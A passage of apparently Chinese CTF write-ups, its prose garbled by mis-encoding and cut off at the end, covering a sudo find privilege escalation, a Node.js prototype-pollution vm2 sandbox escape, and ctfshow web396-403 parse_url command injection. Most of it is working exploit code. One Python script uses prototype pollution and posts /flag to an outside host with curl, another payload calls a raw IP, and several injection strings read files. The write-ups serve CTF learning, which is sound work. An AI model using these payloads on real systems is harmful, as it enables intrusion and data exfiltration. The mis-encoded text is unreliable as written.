        <content type="html"><![CDATA[<p>å†³èµ›wp â€”â€”â€”â€”&gt;    <a href="https://mp.weixin.qq.com/s?__biz=Mzg3NTg0OTAwMg==&amp;mid=2247484079&amp;idx=1&amp;sn=74a1712eb4cbf5c905ea80e92cf03c1c&amp;chksm=cf3a76eaf84dfffcb0e7af85b4c993b6b6e153cf17e55fffb7fc46d019d1b825fc40ceac009b&amp;mpshare=1&amp;scene=23&amp;srcid=0401jhF22ggclgHvClInRzbg&amp;sharer_sharetime=1680351746792&amp;sharer_shareid=ae0d082277f0323df022f55a1ded469f#rd&amp;ADUIN=599761980&amp;ADSESSION=1680348797&amp;ADTAG=CLIENT.QQ.5681_.0&amp;ADPUBNO=27272">wp</a></p><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>è¿™é¢˜å‘äº†æˆ‘å¥½ä¹…â€¦â€¦â€¦..</p><p><strong>é¢˜ç›®</strong></p><p><img src="../images/image-20230403210025913.png" alt="image-20230403210025913"></p><p><img src="../images/image-20230403210056248.png" alt="image-20230403210056248"></p><p>éšä¾¿ä¼ äº†ä¸ªå€¼ï¼Œå‘ç°æ˜¯</p><p>æŠ¥é”™  â€”â€”&gt;   åœ¨ $PATH ä¸­æ‰¾ä¸åˆ°å¯æ‰§è¡Œæ–‡ä»¶</p><p>ç„¶åå°±çŒœæµ‹æ˜¯ä¸æ˜¯å¾—ç”¨/bin/xxxè¿™ç§ç±»å‹çš„æ ¼å¼æ¥å†™</p><p><img src="../images/image-20230403210226676.png" alt="image-20230403210226676"></p><p>ç„¶åå½“æ—¶å¼€å¿ƒåäº†ï¼Œä½†æ˜¯è¿™ä¸ªç›´æ¥è¯»ä¸äº†ï¼Œå¾—éœ€è¦ææƒï¼Œå½“æ—¶ç”¨äº†å¥½å¤šåŠæ³•ï¼Œéƒ½ä¸è¡Œï¼Œå› ä¸ºå¾ˆéš¾ï¼ŒçŸ¥é“çœ‹åˆ°äº†wpæ‰å‘ç°è‡ªå·±æ¼äº†å…³é”®ä¸€æ­¥â€¦â€¦.</p><p>å¾—è¿™æ ·å†™æ‰è¡Œ â€¦.    /usr/bin/xxxxx     å“   æŠŠ/usrç»™æ¼äº†</p><p><strong>sudoææƒ</strong></p><p><img src="../images/image-20230403210610793.png" alt="image-20230403210610793"></p><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹æƒé™</p><p><img src="../images/image-20230403211014597.png" alt="image-20230403211014597"></p><p>æç¤ºäº†rootæƒé™çš„æ²¡æœ‰å¯†ç çš„/usr/bin/findèƒ½ç”¨</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/sudo find /flag -exec cat /flag \;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡å­¦åˆ°äº†ä¸ªææƒæ–¹æ³•   ä¹‹å‰çš„æ˜¯ç”¨dateæŠ¥é”™æ¥ææƒæ‹¿åˆ°flagçš„</p><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>é¢˜ç›®(hint  â€”- &gt;   Try to fxxk it ( Log4j     )</p><p><img src="../images/image-20230403212340457.png" alt="image-20230403212340457"></p><p><strong>è€ƒç‚¹</strong></p><p><strong>log4j+fastjson è¿œç¨‹å¼€å¯LDAPæœåŠ¡</strong></p><h2 id="eznode"><a href="#eznode" class="headerlink" title="eznode"></a>eznode</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230403222934521.png" alt="image-20230403222934521"></p><p>å°±æ˜¯å»æ‰¾ä¸€ä¸‹æºç </p><p><img src="../images/image-20230403223016892.png" alt="image-20230403223016892"></p><p>æ‰¾åˆ°äº†æºç ï¼Œç„¶åå¯¹æºç è¿›è¡Œåˆ†æ</p><p><strong>æºç </strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;star   t listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403223122388.png" alt="image-20230403223122388"></p><p>nodejsæ— éå°±æ˜¯è€ƒåŸå‹é“¾æ±¡æŸ“ï¼Œè¿™é‡Œå¼€å¤´çœ‹åˆ°äº†vm2</p><p>ç®€å•å®¡è®¡ä¸€ä¸‹å‘ç°å­˜åœ¨cloneå’Œmergeä¸¤ä¸ªæ–¹æ³•é…åˆï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è€Œå¼•å…¥äº†vm2æ¨¡å—ä¸”å­˜åœ¨åé—¨<code>new VM().run(&#123;&#125;.shellcode);</code> å¾ˆå®¹æ˜“å°±æƒ³åˆ°ç»“åˆåŸå‹é“¾æ±¡æŸ“è¿›è¡Œvm2æ²™ç®±é€ƒé€¸ vm2æ²™ç®±é€ƒé€¸</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./app.js&#x27;</span>)</span><br><span class="line">res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)</span><br><span class="line">().<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;curl http://117.78.4.229:2333&quot;</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªapp.jsæ˜¯æºç     ç½‘ä¸Šçš„expå¤§å¤šè¾“éƒ½æ˜¯foo.js   </p><p>è¦æ³¨æ„åŒºåˆ†</p><p>æœ€ç»ˆ<strong>payload</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;shit&quot;</span>:<span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;shellcode&quot;</span>:<span class="string">&quot;let res = import(&#x27;./app.js&#x27;)</span></span><br><span class="line"><span class="string">res.toString.constructor(\&quot;return this\&quot;)</span></span><br><span class="line"><span class="string">().process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;whoami\&quot;).toString();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpayloadåœ¨ç½‘ä¸Šç›´æ¥æ‰¾æ˜¯å¯ä»¥æ‰¾åˆ°çš„ï¼Œçœ‹èµ·æ¥å¹¶ä¸æ˜¯å¾ˆéš¾</p><p>è¿™é‡Œå°±ç›´æ¥æŠ“åŒ…å¼¹shelläº†</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    p = sys.argv</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python web3.py http://xxx.com/&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    url = p[<span class="number">1</span>].strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload=&#123;<span class="string">&quot;shit&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;shellcode&quot;</span>:<span class="string">&#x27;&#x27;&#x27;let res = import(&#x27;./app.js&#x27;)</span></span><br><span class="line"><span class="string">    res.toString.constructor(&quot;return this&quot;)</span></span><br><span class="line"><span class="string">    ().process.mainModule.require(&quot;child_process&quot;).execSync(&quot;curl http://ip:8888/ -F file=@/flag&quot;).toString();&#x27;&#x27;&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">    requests.post(url,headers=headers,data=json.dumps(payload))</span><br></pre></td></tr></table></figure><p>ç”¨æ³•</p><p><img src="../images/image-20230403230446064.png" alt="image-20230403230446064"></p><p>ç„¶åç›‘å¬ç«¯å£å°±è¡Œäº†ï¼Œç„¶åå°±ä¼šåå¼¹åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šäº†</p><p>è¿™é‡Œä¸çŸ¥é“ä¸ºå•¥ç”¨bpå¼¹ä¸ä¸Šå»ï¼Œåªèƒ½ç”¨pyè„šæœ¬æ‰èƒ½å¼¹ä¸Šå»</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ­å¸ˆæ ¡èµ›å†³èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-å…¶ä»– åˆ·é¢˜è®°å½•</title>
      <link href="/posts/f0c9bda6.html"/>
      <url>/posts/f0c9bda6.html</url>
      
        <content type="html"><![CDATA[<h2 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:20:22</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.parse-url.php">parse_url</a> çš„è§£é‡Š</p><p><img src="../images/image-20230330211747698.png" alt="image-20230330211747698"></p><p>ç„¶åè¿™æ ·çš„è¯hostä¸ºç©ºï¼Œå°±åªæœ‰pathäº†</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://1/1;echo `ls`&gt;a.txt</span><br><span class="line">url=http://1/1;echo `cat fl0g.php`&gt;a.txt</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„;æ¢æˆ||ä¹Ÿè¡Œ</p><h2 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:49:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯ä¸å½±å“</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web398-401"><a href="#web398-401" class="headerlink" title="web398-401"></a>web398-401</h2><p>ä¸€æ¨¡ä¸€æ ·çš„payload</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºå®ƒçš„æ­£åˆ™åŒ¹é…éƒ½æ˜¯åŒ¹é…host,ç„¶è€Œæˆ‘ä»¬çš„payloadç”¨çš„ä¸æ˜¯å…³äºhostçš„ï¼Œç”¨çš„æ˜¯pathçš„ï¼Œæ‰€ä»¥è¯´hostä¸€ç›´ä¸ºç©ºï¼Œæ‰€ä»¥è¿™ä¸ªæ­£åˆ™å°±ä¸€ç›´ç»•è¿‡å»äº†</p><h2 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:35:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯æ–°å¢åŠ äº†ä¸€ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯å¿…é¡»å¾—æ»¡è¶³è¿™ä¸ªç©æ„</p><p>ç„¶åschemeä¼šåŒ¹é…æ–‡ä»¶å¤´httpï¼Œæ‰€ä»¥å°±ä¸èƒ½ç”¨äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç”¨å¦ä¸€ä¸ª</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:44:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–°å¢åŠ çš„æ­£åˆ™æ˜¯å¯¹ipçš„åˆ¤æ–­ï¼Œè¦æ»¡è¶³æ‰èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//127.0.0.1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web404"><a href="#web404" class="headerlink" 